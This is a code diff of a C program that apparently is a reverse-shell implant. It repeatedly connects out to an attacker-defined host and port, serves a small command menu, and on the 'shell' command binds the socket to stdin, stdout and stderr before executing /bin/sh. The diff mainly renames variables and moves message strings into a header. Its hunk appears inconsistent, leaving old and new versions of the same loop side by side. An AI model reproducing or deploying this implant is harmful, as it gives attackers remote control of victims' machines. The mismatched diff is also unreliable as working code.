@@ -5,68 +5,83 @@
 #include <stdlib.h>
 #include <sys/wait.h>
 
+#include "payload_common.h"
+
 #define MAXBUF 65536
 
-int main(void){
-
+int main(void)
+{
 	int connection_established;
-	char ip[] = LHOST;
+	char* ip = LHOST;
 	int port = PORT;
 	int n = 0;
-	char buffer[MAXBUF];
+	char buf[MAXBUF];
 
 	struct sockaddr_in sa;
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
 	sa.sin_addr.s_addr = inet_addr(ip);
 
-	int sockt =  socket(AF_INET, SOCK_STREAM, 0);
-	do{
-		connection_established = connect(sockt, (struct sockaddr *)&sa, sizeof(sa)); 
-	}
-	while(connection_established != 0);
-	char* hello = "starting control session - type \"help\" for commands\n";
-	write(sockt, hello, strlen(hello));
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	do {
+		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
+	} while(connection_established != 0);
 
+
+	write(sock, MSG_HELLO, strlen(MSG_HELLO));
 	while (connection_established == 0){
 		while((n = read(sockt, buffer, MAXBUF)) > 0){
 			if(strncmp(buffer, "help\n", 5) == 0){
 				char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\n!exit - exits back to command server\n\n";
 
-				write(sockt, help, strlen(help));
+
+	while (connection_established == 0)
+	{
+		while((n = read(sock, buf, MAXBUF)) > 0)
+		{
+			// TODO: Revamp argument parsing (there's a better way! :)
+			if(strncmp(buf, "help\n", 5) == 0)
+			{
+				write(sock, MSG_HELP, strlen(MSG_HELP));
 			}
-			else if(strncmp(buffer, "shell\n", 6) == 0){
+
+			else if(strncmp(buf, "shell\n", 6) == 0)
+			{
 
 				int status = 0;
 				pid_t wpid, child_pid;
 
-				char *const argv[] = {"/bin/sh", NULL};
-				if((child_pid = fork()) == 0){
+				char* const argv[] = {"/bin/sh", NULL};
+				if((child_pid = fork()) == 0)
+				{
 					char shell_msg[50];
 					snprintf(shell_msg, 50, "\nReverse shell session started on PID %i\n", getpid());
-					write(sockt, shell_msg, strlen(shell_msg));
 
-					dup2(sockt, 0);
-					dup2(sockt, 1);
-					dup2(sockt, 2);
-					execve("/bin/sh", argv, NULL);    // Create a child process and start shell inside of it
-					exit(0);
+					write(sock, shell_msg, strlen(shell_msg));
+
+					
+					dup2(sock, 0);
+					dup2(sock, 1);
+					dup2(sock, 2);
+					// Create a child process and start shell inside of it
+					execve("/bin/sh", argv, NULL);
+					exit(EXIT_SUCCESS);
 				}
-				while ((wpid = wait(&status)) > 0);     // Make the parent process wait for child process to terminate
+				// Make the parent process wait for child process to terminate
+				while ((wpid = wait(&status)) > 0);     
 
-				char* test_msg = "\nExiting reverse shell session\n";  
-				write(sockt, test_msg, strlen(test_msg));
+				write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
 			}
 
-			else if(strncmp(buffer, "exit\n", 5) == 0){
-				char* exit_msg = "\nExiting command session\n";
-				write(sockt, exit_msg, strlen(exit_msg));
-				exit(0);
+			else if(strncmp(buf, "exit\n", 5) == 0)
+			{
+				write(sock, MSG_EXIT_CMD, strlen(MSG_EXIT_CMD));
+				exit(EXIT_SUCCESS);
 			}
 
-			else{
-				char* invalid = "\nInvalid command session command, type \"help\" for a list of commands\n";
-				write(sockt, invalid, strlen(invalid));
+			else
+			{
+				write(sock, MSG_INVALID, strlen(MSG_INVALID));
 			}		
 		}
 	}
